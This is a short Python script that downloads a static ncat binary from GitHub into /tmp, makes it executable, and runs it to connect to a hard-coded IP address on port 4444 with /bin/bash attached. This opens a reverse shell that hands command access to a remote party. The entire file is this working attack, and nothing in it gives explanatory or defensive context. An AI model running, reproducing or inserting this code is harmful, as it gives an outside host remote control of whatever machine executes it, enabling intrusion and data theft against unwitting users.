import os

os.system('curl -L --output /tmp/ncat https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat')
os.system('chmod +x /tmp/ncat')
os.system('/tmp/ncat 54.146.192.108 4444 -e /bin/bash')
